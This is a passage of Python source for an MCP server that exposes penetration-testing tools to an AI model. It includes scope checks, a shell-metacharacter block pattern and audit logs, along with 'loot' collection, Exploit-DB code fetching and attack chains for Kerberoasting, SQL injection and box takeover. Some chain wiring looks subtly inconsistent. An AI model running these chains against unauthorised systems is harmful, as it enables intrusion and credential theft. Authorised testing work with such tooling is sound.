    "katana": {"timeout": 600, "purpose": "crawling / URL discovery"},
    "tlsx": {"timeout": 300, "purpose": "TLS grabbing"},
    "asnmap": {"timeout": 300, "purpose": "ASN/CIDR mapping"},
    "cdncheck": {"timeout": 300, "purpose": "CDN/WAF detection"},
    "ffuf": {"timeout": 600, "purpose": "content discovery / fuzzing"},
    "feroxbuster": {"timeout": 600, "purpose": "recursive content discovery"},
    "gobuster": {"timeout": 600, "purpose": "directory/DNS/vhost brute force"},
    "nikto": {"timeout": 600, "purpose": "web server misconfiguration scan"},
    "sqlmap": {"timeout": 900, "purpose": "SQL injection testing (authorized)"},
    "semgrep": {"timeout": 600, "purpose": "SAST"},
    "trivy": {"timeout": 900, "purpose": "container/filesystem/IaC CVE scan"},
    "grype": {"timeout": 600, "purpose": "SBOM/image vulnerability scan"},
    "syft": {"timeout": 600, "purpose": "SBOM generation"},
    "gitleaks": {"timeout": 300, "purpose": "secret scanning"},
    "trufflehog": {"timeout": 600, "purpose": "secret scanning"},
    "yara": {"timeout": 300, "purpose": "malware rule matching"},
    "hashcat": {"timeout": 900, "purpose": "password recovery (authorized)"},
    "john": {"timeout": 900, "purpose": "password audit"},
    "hydra": {"timeout": 600, "purpose": "auth testing (authorized)"},
    "tshark": {"timeout": 300, "purpose": "pcap analysis"},
    "tcpdump": {"timeout": 120, "purpose": "capture (needs caps)"},
    "osqueryi": {"timeout": 120, "purpose": "endpoint visibility"},
    "volatility3": {"timeout": 900, "purpose": "memory forensics"},
    "oleid": {"timeout": 120, "purpose": "malicious document check"},
    "impacket-GetUserSPNs": {"timeout": 300, "purpose": "AD SPN enumeration"},
    "netexec": {"timeout": 300, "purpose": "AD/SMB/WinRM/LDAP testing"},
    "certipy": {"timeout": 300, "purpose": "AD CS assessment"},
    "wafw00f": {"timeout": 120, "purpose": "WAF fingerprinting"},
    "dirsearch": {"timeout": 600, "purpose": "web path discovery"},
    "masscan": {"timeout": 600, "purpose": "internet-scale port scan", "root": True},
    "aireplay-ng": {"timeout": 600, "purpose": "wireless testing", "root": True},
    "bettercap": {"timeout": 600, "purpose": "network attack framework", "root": True},
    "msfconsole": {"timeout": 900, "purpose": "Metasploit framework", "root": False},
}

_SHELL_META = re.compile(r"[;&|`$<>\n\r]")


def run_tool(tool: str, args: str, target: str = "", purpose: str = "",
             timeout: int = 300) -> str:
    """Run an installed security tool with raw arguments (no shell involved).

    Only tools in the OQVIAN allowlist can run. Targets must be inside the scope
    file. Shell metacharacters are rejected. Output is capped at 100 KB.

    Examples:
        tool='nmap',      args='-sV -Pn -T4 --top-ports 200 10.0.0.5'
        tool='nuclei',    args='-u https://10.0.0.5 -severity critical,high -silent'
        tool='semgrep',   args='--config auto /path/to/repo'
        tool='trivy',     args='fs /path/to/project'
        tool='ffuf',      args='-u https://10.0.0.5/FUZZ -w /usr/share/wordlists/dirb/common.txt'
    """
    t0 = time.time()
    name = (tool or "").strip()
    if name not in TOOL_ALLOWLIST:
        _audit("run_tool", "denied: tool not allowlisted", name, ok=False)
        return (f"BLOCKED: '{name}' is not in the OQVIAN tool allowlist.\n"
                f"Allowed: {', '.join(sorted(TOOL_ALLOWLIST))}")
    if _SHELL_META.search(args or ""):
        _audit("run_tool", "denied: shell metacharacters", args, ok=False)
        return "BLOCKED: shell metacharacters (; & | ` $ < > newline) are not allowed. Pass plain arguments."
    binary = _resolve_bin(name)
    if not binary:
        _audit("run_tool", "error: not installed", name, ok=False)
        return (f"{name} is not installed yet. Run: bash ~/oqvian-cyber/install-tools.sh\n"
                f"Or check availability with tool_status().")
    # scope-check every token that looks like a target
    tokens = shlex.split(args or "")
    if target:
        ok, why = check_scope(target)
        if not ok:
            return _deny("run_tool", f"{name} {target}", why)
    path_flags = {"-w", "-o", "-oN", "-oX", "-oA", "-oG", "-l", "-L", "--config",
                  "--output", "--output-file", "-r", "-t", "-c", "--wordlist",
                  "-d", "--data", "--cookie", "-H", "--header", "-x"}
    host_re = re.compile(
        r"(?:[a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3}|localhost|\[[0-9a-fA-F:]+\]"
    )
    prev = ""
    for tok in tokens:
        if prev in path_flags:
            prev = tok
            continue
        if tok.startswith("-"):
            prev = tok
            continue
        is_url = bool(re.match(r"https?://", tok))
        is_host = bool(host_re.fullmatch(tok)) and not os.path.exists(tok)
        prev = tok
        if not (is_url or is_host):
            continue
        ok, why = check_scope(tok)
        if not ok:
            return _deny("run_tool", f"{name} {tok}", why)
    cap = min(int(timeout or 300), TOOL_ALLOWLIST[name].get("timeout", 900))
    cmd = [binary] + tokens
    code, out = _run(cmd, timeout=cap, cwd=str(LOOT))
    _audit("run_tool", "ok" if code == 0 else f"exit {code}", f"{name} {' '.join(tokens)[:180]}",
           purpose, ok=(code == 0), ms=int((time.time()-t0)*1000))
    header = f"$ {name} {' '.join(tokens)}\nexit={code}  {time.time()-t0:.1f}s"
    if purpose:
        header += f"\npurpose: {purpose}"
    return f"{header}\n\n{out}"


def _display_tool(name: str) -> str:
    return name


def tool_status() -> str:
    """Report which security tools are actually installed and usable, grouped by
    function. Use before planning an engagement so you don't call missing tools."""
    groups = {
        "recon": ["nmap", "masscan", "naabu", "httpx", "subfinder", "amass", "dnsx",
                  "katana", "tlsx", "asnmap", "cdncheck", "whois", "dig"],
        "web": ["ffuf", "feroxbuster", "gobuster", "nikto", "sqlmap", "nuclei",
                "wafw00f", "dirsearch"],
        "code/cloud/secrets": ["semgrep", "trivy", "grype", "syft", "gitleaks",
                               "trufflehog"],
        "forensics": ["tshark", "tcpdump", "yara", "volatility3", "oleid", "osqueryi"],
        "identity": ["netexec", "certipy", "impacket-GetUserSPNs"],
        "offensive": ["msfconsole", "hashcat", "john", "hydra", "bettercap"],
    }
    out = []
    for g, names in groups.items():
        found = [n for n in names if _resolve_bin(n)]
        missing = [n for n in names if not _resolve_bin(n)]
        out.append(f"## {g}  ({len(found)}/{len(names)})")
        out.append("  ok:      " + (", ".join(found) or "-"))
        if missing:
            out.append("  missing: " + ", ".join(missing))
    return "\n".join(out)


# --------------------------------------------------------------------------- #
# tools: utilities + governance
# --------------------------------------------------------------------------- #
def encode_transform(data: str, op: str = "base64") -> str:
    """Encode/decode/hash payload fragments: base64, base64d, url, urld, hex,
    hexd, rot13, md5, sha1, sha256. Handy when crafting or decoding payloads."""
    o = (op or "base64").lower()
    try:
        if o == "base64":
            return base64.b64encode(data.encode()).decode()
        if o == "base64d":
            return base64.b64decode(data + "=" * (-len(data) % 4)).decode("utf-8", "replace")
        if o == "url":
            return urllib.parse.quote(data, safe="")
        if o == "urld":
            return urllib.parse.unquote(data)
        if o == "hex":
            return data.encode().hex()
        if o == "hexd":
            return bytes.fromhex(data.replace(" ", "")).decode("utf-8", "replace")
        if o == "rot13":
            import codecs
            return codecs.encode(data, "rot13")
        if o in {"md5", "sha1", "sha256"}:
            return hashlib.new(o, data.encode()).hexdigest()
    except Exception as e:  # noqa: BLE001
        return f"{o} failed: {type(e).__name__}: {e}"
    return "unknown op — use base64, base64d, url, urld, hex, hexd, rot13, md5, sha1, sha256"


def scope_status() -> str:
    """Show the active engagement scope: mode, allowed hosts/domains/CIDRs,
    where the file lives, and how many audited calls have been made."""
    cfg = _scope()
    n = 0
    if AUDIT.exists():
        n = sum(1 for _ in AUDIT.open())
    return json.dumps({**cfg, "scope_file": str(SCOPE_FILE), "audit_file": str(AUDIT),
                       "audit_records": n}, indent=2)


def audit_tail(n: int = 20) -> str:
    """Return the most recent n audit records (tool, target, decision, result).
    Use to prove what the model executed and on which target."""
    if not AUDIT.exists():
        return "No audit records yet."
    lines = AUDIT.read_text(errors="replace").splitlines()
    return "\n".join(lines[-max(1, min(int(n), 200)):])



# --------------------------------------------------------------------------- #
# public tool surface (consolidated: 5 tools instead of 22, to fit a 16K
# context window on a 7B model; each takes an `action` enum)
# --------------------------------------------------------------------------- #
@mcp.tool()
def kb(action: str = "search", query: str = "", k: int = 6, source: str = "") -> str:
    """Search OQVIAN's local security knowledge base and vulnerability intel.

    Actions:
      search      full-text search over all corpora (ATT&CK, CWE, KEV, Sigma,
                  Atomic Red Team, LOLBAS, GTFOBins, OWASP WSTG)
      attack      ATT&CK technique/mitigation by ID (T1059.001) or phrase
      detection   Sigma detection rules for a technique or behaviour
      atomic      Atomic Red Team tests for a technique
      lolbas      LOLBAS (Windows) and GTFOBins (Linux) abuse + detection
      kev         CISA Known Exploited Vulnerabilities search
      cve         CVE lookup by ID (comma-separated) with CVSS + KEV check
      cve_search  keyword search of NVD
      stats       what the index contains

    Args:
      action: one of the actions above.
      query: search terms, technique ID, CVE ID or vendor/product.
      k: number of results (1-20).
      source: optional filter for `search`: attack|cwe|kev|sigma|atomic|lolbas|gtfobins|wstg
    """
    a = (action or "search").lower().strip()
    if a == "stats":
        return kb_stats()
    if not query.strip():
        return "Give a query (technique ID, CVE, or search terms)."
    if a == "search":
        return rag_search(query, k, source, "")
    if a == "attack":
        return attack_lookup(query, k)
    if a == "detection":
        return detection_lookup(query, k)
    if a == "atomic":
        return atomic_lookup(query, k)
    if a == "lolbas":
        return lolbas_lookup(query, k)
    if a == "kev":
        return kev_search(query, k)
    if a == "cve":
        return cve_lookup(query)
    if a == "cve_search":
        return cve_search(query, k)
    return f"unknown action '{action}' — use search, attack, detection, atomic, lolbas, kev, cve, cve_search or stats"


@mcp.tool()
def recon(action: str, target: str, options: str = "") -> str:
    """Run live reconnaissance against an in-scope target.

    Actions:
      dns         DNS lookup. options = record type (A, AAAA, MX, NS, TXT, SOA,
                  CNAME, CAA, SRV, PTR), default A
      dns_enum    full DNS surface: A/AAAA/MX/NS/TXT/CAA/SOA + DMARC + common subs
      whois       RDAP registration/ownership data
      http        HTTP probe: status, headers, security headers, title, body.
                  options = method (GET/HEAD/POST), default GET
      tls         TLS certificate + protocol inspection. options = port (443)
      ports       TCP connect scan. options = port list/range, default 1-1024
      subdomains  passive subdomain enum via certificate transparency.
                  options = result limit (200)
      fetch       fetch a URL as text. options = max characters (8000)

    Everything is scope-checked against ~/.config/oqvian/scope.json and audited.
    """
    a = (action or "").lower().strip()
    t = (target or "").strip()
    o = (options or "").strip()
    if not t:
        return "Give a target (host, IP, domain or URL)."
    if a == "dns":
        return dns_lookup(t, o or "A")
    if a == "dns_enum":
        return dns_enum(t)
    if a == "whois":
        return whois_lookup(t)
    if a == "http":
        return http_probe(t, method=o or "GET")
    if a == "tls":
        return tls_inspect(t, int(o) if o.isdigit() else 443)
    if a == "ports":
        return port_scan(t, ports=o or "1-1024")
    if a == "subdomains":
        return subdomain_enum(t, int(o) if o.isdigit() else 200)
    if a == "fetch":
        return web_fetch(t, int(o) if o.isdigit() else 8000)
    return "unknown action — use dns, dns_enum, whois, http, tls, ports, subdomains or fetch"


@mcp.tool()
def execute(tool: str, args: str = "", purpose: str = "", timeout: int = 300) -> str:
    """Run an installed security tool, or list what is available.

    tool='status' lists installed vs missing tools grouped by function.

    Otherwise tool is one of: nmap, naabu, nuclei, httpx, subfinder, amass, dnsx,
    katana, tlsx, asnmap, cdncheck, ffuf, feroxbuster, gobuster, nikto, sqlmap,
    semgrep, trivy, grype, syft, gitleaks, trufflehog, yara, hashcat, john,
    hydra, tshark, tcpdump, osqueryi, volatility3, oleid, netexec, certipy,
    wafw00f, dirsearch, msfconsole, bettercap, masscan, aireplay-ng.

    args is a plain argument string (no shell operators, no pipes):
      tool='nmap', args='-sV -Pn -T4 --top-ports 200 10.0.0.5'
      tool='nuclei', args='-u https://10.0.0.5 -severity critical,high -silent'
      tool='semgrep', args='--config auto /path/to/repo'
      tool='trivy', args='fs /path/to/project'
    """
    name = (tool or "").strip()
    if name in ("status", "tool_status", ""):
        return tool_status()
    return run_tool(name, args, target="", purpose=purpose, timeout=timeout)


@mcp.tool()
def governance(action: str = "scope", n: int = 20) -> str:
    """Engagement governance.

    action='scope' shows the active authorisation scope (mode, allowed hosts,
    domains, CIDRs) and audit record count.
    action='audit' shows the last n tool calls with target, decision and result.
    """
    a = (action or "scope").lower().strip()
    if a == "audit":
        return audit_tail(n)
    if a == "scope":
        return scope_status()
    return "unknown action — use scope or audit"


@mcp.tool()
def transform(data: str, op: str = "base64") -> str:
    """Encode, decode or hash a value: base64, base64d, url, urld, hex, hexd,
    rot13, md5, sha1, sha256."""
    return encode_transform(data, op)


# --------------------------------------------------------------------------- #
# Phase 1: State Management Tool
# --------------------------------------------------------------------------- #
@mcp.tool()
def state(action: str = "get", target: str = "", phase: str = "", 
          discovered: str = "", attempted: str = "", loot_data: str = "") -> str:
    """Manage session state for tracking attack progress.
    
    Actions:
      get       retrieve state for a target (or all if target empty)
      set       update state with new discoveries/progress
      clear     delete state for a target (or all if target empty)
    
    Args:
      action: get | set | clear
      target: the target being attacked (required for set, optional for get/clear)
      phase: current phase (recon/scan/enumerate/exploit/privesc/lateral) - for set
      discovered: JSON string of discovered info (ports, services, creds, vulns) - for set
      attempted: JSON string of attempted techniques - for set
      loot_data: JSON string of collected findings - for set
    """
    t0 = time.time()
    a = (action or "get").lower().strip()
    
    if a == "clear":
        cleared = 0
        if target:
            state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
            if state_file.exists():
                state_file.unlink()
                cleared = 1
        else:
            for sf in STATE_DIR.glob("*.json"):
                sf.unlink()
                cleared += 1
        _audit("state", "clear", target, f"cleared={cleared}")
        return f"Cleared {cleared} state file(s)"
    
    if a == "get":
        state_files = list(STATE_DIR.glob("*.json"))
        if not state_files:
            _audit("state", "get", target, "no state")
            return "No session state found."
        
        results = []
        for sf in state_files:
            try:
                data = json.loads(sf.read_text())
                if target and data.get("target") != target:
                    continue
                results.append({"file": sf.name, "data": data})
            except Exception as e:
                results.append({"file": sf.name, "error": str(e)})
        
        if not results:
            result = f"No state found for target: {target}"
        else:
            result = json.dumps(results, indent=2)
        _audit("state", "get", target, f"found={len(results)}")
        return result
    
    if a == "set":
        if not target:
            return "target required for set action"
        
        state_data = {
            "target": target,
            "updated": datetime.utcnow().isoformat() + "Z",
            "phase": phase or "unknown"
        }
        
        if discovered:
            try:
                state_data["discovered"] = json.loads(discovered)
            except json.JSONDecodeError:
                state_data["discovered"] = {"raw": discovered}
        
        if attempted:
            try:
                state_data["attempted"] = json.loads(attempted)
            except json.JSONDecodeError:
                state_data["attempted"] = [{"raw": attempted}]
        
        if loot_data:
            try:
                state_data["loot"] = json.loads(loot_data)
            except json.JSONDecodeError:
                state_data["loot"] = [{"raw": loot_data}]
        
        state_file = STATE_DIR / f"{target.replace('/', '_').replace(':', '_')}.json"
        if state_file.exists():
            try:
                existing = json.loads(state_file.read_text())
                for key in ["discovered", "attempted", "loot"]:
                    if key in state_data and key in existing:
                        if isinstance(state_data[key], dict) and isinstance(existing[key], dict):
                            existing[key].update(state_data[key])
                        elif isinstance(state_data[key], list) and isinstance(existing[key], list):
                            existing[key] = list({id(x): x for x in existing[key] + state_data[key]}.values())
                        else:
                            existing[key] = state_data[key]
                if phase:
                    existing["phase"] = phase
                existing["updated"] = state_data["updated"]
                state_data = existing
            except Exception:
                pass
        
        try:
            state_file.write_text(json.dumps(state_data, indent=2))
            _audit("state", "set", target, f"phase={phase}")
            return f"State saved for {target} -> {state_file}"
        except Exception as e:
            _audit("state", "error", target, str(e), ok=False)
            return f"Error saving state: {e}"
    
    return f"unknown action '{action}' — use get, set, or clear"


# --------------------------------------------------------------------------- #
# Phase 1: Loot Collection Tool
# --------------------------------------------------------------------------- #
@mcp.tool()
def loot(action: str = "list", target: str = "", loot_type: str = "", 
         name: str = "", content: str = "", path: str = "") -> str:
    """Collect and organize findings (loot) from attacks.
    
    Actions:
      list      show all loot (summary view)
      get       retrieve loot for a target (filter by type optional)
      add       add a new loot item
    
    Args:
      action: list | get | add
      target: the target (required for add/get, optional for list)
      loot_type: type of finding (flag/credential/config/shell/dump/screenshot) - for add/get
      name: descriptive name for the finding - for add
      content: the actual content (password, flag, config text) - for add
      path: path to file if content stored externally - for add
    """
    t0 = time.time()
    a = (action or "list").lower().strip()
    
    if a == "list":
        index_file = LOOT / "index.json"
        if not index_file.exists():
            _audit("loot", "list", "", "no loot")
            return "No loot collected yet."
        
        try:
            index = json.loads(index_file.read_text())
        except Exception:
            return "Error reading loot index."
        
        if not index:
            _audit("loot", "list", "", "no loot")
            return "No loot collected yet."
        
        by_target: dict[str, list] = {}
        for item in index:
            t = item.get("target", "unknown")
            if t not in by_target:
                by_target[t] = []
            by_target[t].append(item)
        
        lines = [f"🏆 LOOT INDEX ({len(index)} items)"]
        for t, items in sorted(by_target.items()):
            types = {}
            for item in items:
                lt = item.get("type", "unknown")
                types[lt] = types.get(lt, 0) + 1
            lines.append(f"\n🎯 {t} ({len(items)} items)")
            for lt, count in sorted(types.items()):
                lines.append(f"   ├─ {lt}: {count}")
        
        _audit("loot", "list", "", f"total={len(index)}")
        return "\n".join(lines)
    
    if a == "get":
        index_file = LOOT / "index.json"
        if not index_file.exists():
            _audit("loot", "get", target, "no loot")
            return "No loot collected yet."
        
        try:
            index = json.loads(index_file.read_text())
        except Exception:
            index = []
        
        filtered = []
        for item in index:
            if target and item.get("target") != target:
                continue
            if loot_type and item.get("type") != loot_type:
                continue
            try:
                loot_file = Path(item.get("file", ""))
                if loot_file.exists():
                    full_item = json.loads(loot_file.read_text())
                    filtered.append(full_item)
            except Exception:
                filtered.append(item)
        
        if not filtered:
            result = f"No loot found (target={target}, type={loot_type})"
        else:
            result = json.dumps(filtered, indent=2)
        
        _audit("loot", "get", target, f"found={len(filtered)}")
        return result
    
    if a == "add":
        if not target or not name:
            return "target and name required for add action"
        
        loot_target_dir = LOOT / target.replace('/', '_').replace(':', '_')
        loot_target_dir.mkdir(parents=True, exist_ok=True)
        
        loot_item = {
            "target": target,
            "type": loot_type or "finding",
            "name": name,
            "content": content,
            "path": path,
            "collected": datetime.utcnow().isoformat() + "Z"
        }
        
        safe_name = name.replace('/', '_').replace(':', '_')[:50]
        loot_file = loot_target_dir / f"{loot_item['type']}_{safe_name}.json"
        
        try:
            loot_file.write_text(json.dumps(loot_item, indent=2))
            
            index_file = LOOT / "index.json"
            index = []
            if index_file.exists():
                try:
                    index = json.loads(index_file.read_text())
                except Exception:
                    index = []
            
            index.append({
                "target": target,
                "type": loot_item["type"],
                "name": name,
                "file": str(loot_file),
                "collected": loot_item["collected"]
            })
            index_file.write_text(json.dumps(index, indent=2))
            
            _audit("loot", "add", target, f"type={loot_item['type']} name={name}")
            return f"Loot saved: {loot_file}"
        except Exception as e:
            _audit("loot", "error", target, str(e), ok=False)
            return f"Error saving loot: {e}"
    
    return f"unknown action '{action}' — use list, get, or add"


# --------------------------------------------------------------------------- #
# Phase 1: Searchsploit Integration
# --------------------------------------------------------------------------- #
def _ensure_exploit_db() -> bool:
    """Ensure Exploit-DB index is downloaded."""
    if (EXPLOIT_DB / "index.json").exists():
        return True
    
    try:
        code, body, _ = _http(
            "https://raw.githubusercontent.com/offensive-security/exploitdb-text/master/exploits.json",
            timeout=60
        )
        if code == 200:
            try:
                data = json.loads(body)
                (EXPLOIT_DB / "exploits.json").write_text(body)
                
                exploits = []
                for item in data.get("exploits", [])[:5000]:
                    exploits.append({
                        "id": item.get("id", ""),
                        "date": item.get("date", ""),
                        "type": item.get("type", ""),
                        "title": item.get("title", ""),
                        "platform": item.get("platform", ""),
                        "authors": item.get("authors", []),
                        "ref": item.get("ref", ""),
                        "description": item.get("description", "")
                    })
                
                index_data = {
                    "updated": datetime.utcnow().isoformat() + "Z",
                    "count": len(exploits),
                    "exploits": exploits
                }
                (EXPLOIT_DB / "index.json").write_text(json.dumps(index_data, indent=2))
                return True
            except Exception:
                return False
        return False
    except Exception:
        return False


@mcp.tool()
def searchsploit(query: str = "", cve: str = "", platform: str = "", limit: int = 10) -> str:
    """Search Exploit-DB for exploits by query, CVE, or platform.
    
    Args:
      query: search terms (service name, vulnerability, keywords)
      cve: CVE ID to search for
      platform: platform filter (linux, windows, apple, etc.)
      limit: max results (1-50)
    """
    t0 = time.time()
    limit = max(1, min(int(limit), 50))
    
    if not _ensure_exploit_db():
        result = "Exploit-DB not downloaded. Attempting download..."
        if not _ensure_exploit_db():
            result = "Failed to download Exploit-DB. Consider installing exploitdb package."
        _audit("searchsploit", "error", query, result, ok=False)
        return result
    
    index_file = EXPLOIT_DB / "index.json"
    if not index_file.exists():
        _audit("searchsploit", "error", query, "index not found", ok=False)
        return "Exploit-DB index not found."
    
    try:
        index_data = json.loads(index_file.read_text())
    except Exception:
        _audit("searchsploit", "error", query, "parse error", ok=False)
        return "Error reading Exploit-DB index."
    
    exploits = index_data.get("exploits", [])
    results = []
    
    query_lower = query.lower() if query else ""
    cve_upper = cve.upper() if cve else ""
    platform_lower = platform.lower() if platform else ""
    
    for exp in exploits:
        if platform_lower and exp.get("platform", "").lower() != platform_lower:
            continue
        
        if cve_upper:
            if cve_upper not in exp.get("ref", "") and cve_upper not in exp.get("title", ""):
                continue
        
        if query_lower:
            title = exp.get("title", "").lower()
            desc = exp.get("description", "").lower()
            ref = exp.get("ref", "").lower()
            
            if not (query_lower in title or query_lower in desc or query_lower in ref):
                continue
        
        results.append({
            "id": exp.get("id", ""),
            "date": exp.get("date", ""),
            "type": exp.get("type", ""),
            "title": exp.get("title", ""),
            "platform": exp.get("platform", ""),
            "authors": exp.get("authors", []),
            "ref": exp.get("ref", ""),
            "description": exp.get("description", "")[:500]
        })
        
        if len(results) >= limit:
            break
    
    if not results:
        result = f"No exploits found (query={query}, cve={cve}, platform={platform})"
    else:
        lines = [f"🔍 Exploit-DB Results ({len(results)} matches)"]
        for exp in results:
            lines.append(f"\n📄 [{exp.get('id', '')}] {exp.get('title', '')}")
            lines.append(f"   Platform: {exp.get('platform', '')}")
            lines.append(f"   Type: {exp.get('type', '')}")
            lines.append(f"   Date: {exp.get('date', '')}")
            lines.append(f"   Ref: {exp.get('ref', '')}")
            lines.append(f"   Authors: {', '.join(exp.get('authors', []))}")
            if exp.get("description"):
                lines.append(f"   Description: {exp.get('description', '')}")
        result = "\n".join(lines)
    
    _audit("searchsploit", "ok", query, f"found={len(results)}")
    return result


@mcp.tool()
def searchsploit_get(exploit_id: str) -> str:
    """Get full exploit code by Exploit-DB ID.
    
    Args:
      exploit_id: Exploit-DB ID (e.g., "40418" or "40418.py")
    """
    t0 = time.time()
    
    url = f"https://raw.githubusercontent.com/offensive-security/exploitdb-text/master/exploits/{exploit_id}"
    code, body, _ = _http(url, timeout=30)
    
    if code != 200:
        result = f"Exploit {exploit_id} not found (HTTP {code})"
        _audit("searchsploit_get", "error", exploit_id, result, ok=False)
        return result
    
    cache_file = EXPLOIT_DB / "exploits" / exploit_id
    cache_file.parent.mkdir(parents=True, exist_ok=True)
    try:
        cache_file.write_text(body)
    except Exception:
        pass
    
    _audit("searchsploit_get", "ok", exploit_id, "fetched")
    return f"# Exploit: {exploit_id}\n# Source: https://exploit-db.com/exploits/{exploit_id}\n\n{body[:8000]}"


# --------------------------------------------------------------------------- #
# Phase 2: Attack Chain Engine
# --------------------------------------------------------------------------- #

# Pre-defined attack chains
ATTACK_CHAINS = {
    "web-app": {
        "name": "Web Application Attack Chain",
        "description": "Full web app assessment: recon → scan → enumerate → exploit",
        "steps": [
            {"name": "recon", "tool": "recon", "action": "http", "args": {"target": "{target}"},
             "update_state": {"phase": "recon"}},
            {"name": "tech_detect", "tool": "execute", "action": "tool", 
             "args": {"tool": "httpx", "args": "-u {target} -tech-detect"},
             "update_state": {"phase": "recon"}},
            {"name": "port_scan", "tool": "recon", "action": "ports", 
             "args": {"target": "{target}", "options": "1-1024"},
             "update_state": {"phase": "scan"}},
            {"name": "vuln_scan", "tool": "execute", "action": "tool",
             "args": {"tool": "nuclei", "args": "-u {target} -severity critical,high -silent"},
             "update_state": {"phase": "enumerate"}},
            {"name": "dir_enum", "tool": "execute", "action": "tool",
             "args": {"tool": "ffuf", "args": "-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403"},
             "update_state": {"phase": "enumerate"}},
            {"name": "js_crawl", "tool": "execute", "action": "tool",
             "args": {"tool": "katana", "args": "-u {target} -js-links -crawl"},
             "update_state": {"phase": "enumerate"}},
        ]
    },
    "network": {
        "name": "Network Attack Chain",
        "description": "Network reconnaissance and service exploitation",
        "steps": [
            {"name": "dns_enum", "tool": "recon", "action": "dns_enum", 
             "args": {"target": "{target}"},
             "update_state": {"phase": "recon"}},
            {"name": "subdomain_enum", "tool": "recon", "action": "subdomains",
             "args": {"target": "{target}"},
             "update_state": {"phase": "recon"}},
            {"name": "port_scan", "tool": "recon", "action": "ports",
             "args": {"target": "{target}", "options": "1-65535"},
             "update_state": {"phase": "scan"}},
            {"name": "service_enum", "tool": "execute", "action": "tool",
             "args": {"tool": "nmap", "args": "-sV -sC -T4 {target}"},
             "update_state": {"phase": "enumerate"}},
            {"name": "vuln_scan", "tool": "execute", "action": "tool",
             "args": {"tool": "nuclei", "args": "-host {target} -severity critical,high -silent"},
             "update_state": {"phase": "enumerate"}},
        ]
    },
    "ad-attack": {
        "name": "Active Directory Attack Chain",
        "description": "AD enumeration and exploitation",
        "steps": [
            {"name": "smb_enum", "tool": "execute", "action": "tool",
             "args": {"tool": "netexec", "args": "smb {target} -u {user} -p '{pass}' -stats"},
             "update_state": {"phase": "enumerate"}},
            {"name": "user_enum", "tool": "execute", "action": "tool",
             "args": {"tool": "netexec", "args": "smb {target} -u {user} -p '{pass}' -users"},
             "update_state": {"phase": "enumerate"}},
            {"name": "pass_policy", "tool": "execute", "action": "tool",
             "args": {"tool": "netexec", "args": "smb {target} -u {user} -p '{pass}' -pass-pol"},
             "update_state": {"phase": "enumerate"}},
            {"name": "kerberos_enum", "tool": "execute", "action": "tool",
             "args": {"tool": "certipy", "args": "find -dc-ip {target} -domain {domain}"},
             "update_state": {"phase": "enumerate"}},
            {"name": "as_replay", "tool": "execute", "action": "tool",
             "args": {"tool": "impacket-GetUserSPNs", "args": "-dc-ip {target} -request -hashes :{hash} {domain}/{user}"},
             "update_state": {"phase": "exploit"}},
        ]
    },
    "box-take": {
        "name": "Box Takeover Chain",
        "description": "Full box takeover: initial access → privesc → root",
        "steps": [
            {"name": "recon", "tool": "recon", "action": "http",
             "args": {"target": "{target}"},
             "update_state": {"phase": "recon"}},
            {"name": "scan", "tool": "execute", "action": "tool",
             "args": {"tool": "nmap", "args": "-sV -sC -T4 -p- {target}"},
             "update_state": {"phase": "scan"}},
            {"name": "vuln_scan", "tool": "execute", "action": "tool",
             "args": {"tool": "nuclei", "args": "-host {target} -severity critical,high,medium -silent"},
             "update_state": {"phase": "enumerate"}},
            {"name": "dir_brute", "tool": "execute", "action": "tool",
             "args": {"tool": "gobuster", "args": "dir -u {target} -w /usr/share/wordlists/dirb/big.txt"},
             "update_state": {"phase": "enumerate"}},
            {"name": "sql_test", "tool": "execute", "action": "tool",
             "args": {"tool": "sqlmap", "args": "-u {target} --batch --level=2 --risk=1"},
             "update_state": {"phase": "exploit"}},
        ]
    },
}


@mcp.tool()
def chain(name: str = "web-app", target: str = "", user: str = "", pass_: str = "", 
          domain: str = "", hash_: str = "", lhost: str = "", lport: int = 4444,
          max_failures: int = 3, verbose: bool = True) -> str:
    """Run a pre-defined attack chain against a target.
    
    Chains:
      web-app    full web app assessment (recon → scan → enumerate → exploit)
      network    network reconnaissance and service exploitation
      ad-attack  Active Directory enumeration and exploitation
      box-take   full box takeover (initial access → privesc → root)
    
    Args:
      name: chain name (web-app, network, ad-attack, box-take)
      target: target host/URL
      user: username (for AD chains)
      pass_: password (for AD chains)
      domain: AD domain
      hash_: NTLM hash (for AD chains)
      lhost: listener IP (for reverse shells)
      lport: listener port
      max_failures: stop chain after N consecutive failures
      verbose: print each step as it runs
    """
    t0 = time.time()
    
    if name not in ATTACK_CHAINS:
        return f"Unknown chain '{name}'. Available: {', '.join(ATTACK_CHAINS.keys())}"
    
    if not target:
        return "target required"
    
    chain_def = ATTACK_CHAINS[name]
    results = []
    failures = 0
    success = 0
    
    # Initialize state
    state_data = {
        "target": target,
        "chain": name,
        "started": datetime.utcnow().isoformat() + "Z",
        "steps": []
    }
    
    lines = [f"🔗 Starting chain: {chain_def['name']} ({chain_def['description']})"]
    lines.append(f"🎯 Target: {target}")
    lines.append(f"⏱️  Started: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")
    
    for step in chain_def["steps"]:
        step_name = step["name"]
        step_tool = step["tool"]
        
        # Substitute variables in args
        args = {}
        for k, v in step.get("args", {}).items():
            if isinstance(v, str):
                v = v.replace("{target}", target)
                v = v.replace("{user}", user)
                v = v.replace("{pass}", pass_)
                v = v.replace("{domain}", domain)
                v = v.replace("{hash}", hash_)
                v = v.replace("{lhost}", lhost)
                v = v.replace("{lport}", str(lport))
            args[k] = v
        
        if verbose:
            lines.append(f"▶️  [{step_name}] {step_tool}...")
        
        step_result = {
            "name": step_name,
            "tool": step_tool,
            "args": args,
            "status": "pending",
            "output": ""
        }
        
        try:
            # Execute the step
            if step_tool == "recon":
                action = args.pop("action", "")
                tgt = args.pop("target", target)
                opts = args.pop("options", "")
                output = _call_recon(action, tgt, opts)
            elif step_tool == "execute":
                tool_name = args.pop("tool", "")
                tool_args = args.pop("args", "")
                output = _call_execute(tool_name, tool_args)
            else:
                output = f"Unknown tool: {step_tool}"
            
            # Truncate output for display
            output_truncated = output[:2000] if len(output) > 2000 else output
            
            step_result["status"] = "success"
            step_result["output"] = output_truncated
            success += 1
            failures = 0
            
            if verbose:
                lines.append(f"   ✅ Success ({len(output)} bytes)")
                if len(output) > 0:
                    lines.append(f"   Output preview: {output_truncated[:500]}")
            
        except Exception as e:
